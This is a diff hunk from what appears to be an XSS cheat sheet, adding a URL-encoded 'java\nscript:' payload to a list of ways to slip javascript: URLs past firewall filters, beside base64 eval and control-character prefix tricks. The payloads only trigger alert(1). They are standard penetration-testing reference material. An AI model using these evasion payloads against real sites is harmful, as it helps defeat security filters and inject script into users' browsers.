@@ -101,6 +101,7 @@ eval(atob('YWxlcnQoMSk=')) <br>
 If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
 Add any number of \n \t or \r in the middle <br>
 java\nscript: <br>
+java\nscript:%61lert(1)// 
 Add characters from \x00- \x20 at the beginning <br>
 \x01javascript: <br>
 \00xjavascript: <br>
